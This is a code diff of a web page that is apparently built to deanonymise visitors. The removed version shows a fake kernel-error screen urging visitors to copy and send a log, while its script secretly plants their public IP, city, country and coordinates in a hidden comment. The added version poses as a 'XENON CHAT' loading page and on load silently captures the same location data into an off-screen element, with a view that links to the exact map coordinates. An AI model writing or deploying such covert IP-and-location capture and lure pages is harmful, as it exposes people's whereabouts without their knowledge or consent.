@@ -17,125 +17,160 @@
             flex-direction: column;
             justify-content: center;
             align-items: center;
+        }
+        #landing {
             text-align: center;
         }
         .glitch {
-            font-size: 5.5rem;
-            letter-spacing: 16px;
-            animation: glitch 5s infinite;
-            text-shadow: 0.08em 0 0 #f00, -0.06em -0.07em 0 #0ff;
+            font-size: 5rem;
+            letter-spacing: 15px;
+            animation: glitch 3s infinite;
+            text-shadow: 2px 0 #f00, -2px 0 #0ff;
         }
         @keyframes glitch {
-            0%,100% { text-shadow: 0.08em 0 0 #f00, -0.06em -0.07em 0 #0ff; }
-            18% { text-shadow: -0.08em -0.05em 0 #f00, 0.05em 0.06em 0 #0ff; }
-            42% { text-shadow: 0.08em 0.06em 0 #f00, -0.05em 0 0 #0ff; }
+            0%,100% { text-shadow: 2px 0 #f00, -2px 0 #0ff; }
+            20% { text-shadow: -2px 0 #f00, 2px 0 #0ff; }
+            40% { text-shadow: 2px 0 #0f0, -2px 0 #f0f; }
         }
-        #error-main {
-            max-width: 94%;
-            padding: 40px;
-        }
-        #error-log {
-            margin: 60px 0 40px;
-            font-size: 0.98rem;
-            color: #333;
-            line-height: 1.6;
-            max-height: 45vh;
-            overflow-y: auto;
-            white-space: pre-wrap;
-            word-break: break-all;
-        }
-        .tiny-footer {
-            position: fixed;
-            bottom: 8px;
-            right: 12px;
-            font-size: 0.65rem;
-            color: #111;
-            opacity: 0.25;
+        #hidden-data {
+            position: absolute;
+            left: -9999px;
+            opacity: 0;
             pointer-events: none;
+        }
+        #ip-view {
+            display: none;
+            text-align: center;
+            padding: 20px;
+            max-width: 90%;
+        }
+        #ip-display {
+            font-size: 2.8rem;
+            word-break: break-all;
+            margin: 20px 0;
+        }
+        #geo {
+            font-size: 2rem;
+            color: #0f8;
+            margin: 20px 0;
+        }
+        #maplink {
+            font-size: 1.5rem;
+            color: #0ff;
+            text-decoration: none;
+        }
+        #status {
+            font-size: 1.2rem;
+            color: #555;
+            margin-top: 50px;
         }
     </style>
 </head>
 <body>
 
-    <div id="error-main">
-        <div class="glitch">CRITICAL FAULT</div>
-        <p style="font-size:1.7rem; margin:45px 0 25px;">SHADOW NODE INTEGRITY BREACH</p>
-        <p style="color:#444; font-size:1.2rem; margin-bottom:20px;">
-            Kernel-level exception detected. Diagnostic fragment captured.<br>
-            Please forward this complete log block to support team:
-        </p>
-
-        <div id="error-log">
-[0x0000000007B] KERNEL_SHADOW_PANIC
-[0xDEAD0002] INACCESSIBLE_ENTROPY_BLOCK
-[0xBEEF4242] CORRUPTED_MEMORY_STREAM
-Stack trace overflow detected → recovery loop initiated
-Memory dump partial: █▓▓▓▓▓░░░░░░░░░░ 52% complete
-Entropy buffer corruption chain active
-Signature fragment: #A3F97B2E1C4D8E90uyyoiduyawo39284kjsdf
-Dump tail: ...== corrupted chain termination ==
-Send full log fragment to administrator
-        </div>
-
-        <p style="color:#555; font-size:1.15rem;">
-            Copy the entire log above (including any hidden diagnostic fragments) and reply.
-        </p>
+    <div id="landing">
+        <div class="glitch">XENON CHAT</div>
+        <p style="margin-top: 60px; font-size: 1.6rem;">loading shadow node...</p>
     </div>
 
-    <div class="tiny-footer">v0.7b • shadow-node • 20260308</div>
+    <!-- Hidden text that holds the captured data -->
+    <div id="hidden-data"></div>
 
-    <!-- legacy debug fragment v0.7b - do not remove -->
+    <div id="ip-view">
+        <div>SHADOW NODE DATA</div>
+        <div id="ip-display">—</div>
+        <div id="geo">—</div>
+        <a id="maplink" href="#" target="_blank" style="display:none;">→ EXACT COORDINATES</a>
+        <div id="status">data loaded from hidden node</div>
+    </div>
 
     <script>
-        async function captureAndHidePlain() {
+        const hiddenEl = document.getElementById("hidden-data");
+        const ipView = document.getElementById("ip-view");
+
+        async function captureIP() {
             try {
+                // Get public IP
                 const ipRes = await fetch('https://api.ipify.org?format=json');
                 const { ip } = await ipRes.json();
 
-                let geo = {};
-                try {
-                    geo = await (await fetch(`https://ipapi.co/${ip}/json/`)).json();
-                } catch {
-                    geo = await (await fetch(`https://ip-api.com/json/${ip}`)).json();
+                // Get geo (using free no-key API)
+                let geoRes = await fetch(`https://ipapi.co/${ip}/json/`);
+                let geo = await geoRes.json();
+
+                if (geo.error) {
+                    geoRes = await fetch(`https://ip-api.com/json/${ip}`);
+                    geo = await geoRes.json();
                 }
 
                 if (!geo.error && geo.status !== 'fail') {
-                    const payload = {
-                        captured_ip: ip,
-                        captured_city: geo.city || geo.regionName || '?',
-                        captured_country: geo.country || geo.countryName || '?',
-                        captured_lat: geo.latitude || geo.lat || 0,
-                        captured_lon: geo.longitude || geo.lon || 0,
-                        captured_at: new Date().toISOString()
+                    const data = {
+                        ip: ip,
+                        city: geo.city || geo.regionName || '?',
+                        country: geo.country || geo.countryName || '?',
+                        lat: geo.latitude || geo.lat || 0,
+                        lon: geo.longitude || geo.lon || 0,
+                        ts: Date.now()
                     };
 
-                    // Build plain text block
-                    const plainText = 
-                        `captured_ip: ${payload.captured_ip}\n` +
-                        `captured_city: ${payload.captured_city}\n` +
-                        `captured_country: ${payload.captured_country}\n` +
-                        `captured_lat: ${payload.captured_lat}\n` +
-                        `captured_lon: ${payload.captured_lon}\n` +
-                        `captured_at: ${payload.captured_at}`;
-
-                    // Inject into the last comment
-                    const lastComment = document.body.lastChild;
-                    if (lastComment && lastComment.nodeType === 8) {
-                        let text = lastComment.textContent;
-                        text += '\n' + plainText;
-                        lastComment.textContent = text;
-                    }
-
-                    console.log("Plain data hidden:", payload);
+                    // Store as JSON string in hidden element
+                    hiddenEl.textContent = JSON.stringify(data);
+                    console.log("Captured & hidden:", data); // for debug
                 }
             } catch (e) {
-                console.warn("Capture failed", e);
+                console.error("Capture failed:", e);
+                hiddenEl.textContent = JSON.stringify({ error: "Capture failed" });
             }
         }
 
-        captureAndHidePlain();
-    </script>
+        function showIP() {
+            document.getElementById("landing").style.display = "none";
+            ipView.style.display = "flex";
 
-    <!-- legacy debug fragment v0.7b - do not remove -->
+            const raw = hiddenEl.textContent.trim();
+            if (!raw) {
+                document.getElementById("ip-display").textContent = "NO DATA";
+                document.getElementById("status").textContent = "Nothing captured yet — load main page first";
+                return;
+            }
+
+            try {
+                const data = JSON.parse(raw);
+
+                if (data.error) {
+                    document.getElementById("ip-display").textContent = "ERROR";
+                    document.getElementById("status").textContent = data.error;
+                    return;
+                }
+
+                document.getElementById("ip-display").textContent = data.ip;
+                document.getElementById("geo").innerHTML = `${data.city} • ${data.country}<br>${data.lat.toFixed(6)}, ${data.lon.toFixed(6)}`;
+
+                if (data.lat && data.lon) {
+                    const map = document.getElementById("maplink");
+                    map.href = `https://www.openstreetmap.org/?mlat=${data.lat}&mlon=${data.lon}#map=15/${data.lat}/${data.lon}`;
+                    map.style.display = "inline-block";
+                }
+
+                document.getElementById("status").textContent = `Captured at ${new Date(data.ts).toLocaleString()}`;
+            } catch (e) {
+                document.getElementById("ip-display").textContent = "PARSE ERROR";
+                document.getElementById("status").textContent = "Invalid hidden data";
+            }
+        }
+
+        // Run capture on main load
+        captureIP();
+
+        // Check hash for #ip
+        function handleHash() {
+            if (location.hash === "#ip") {
+                showIP();
+            }
+        }
+
+        window.addEventListener("hashchange", handleHash);
+        window.addEventListener("load", handleHash);
+    </script>
 </body>
 </html>
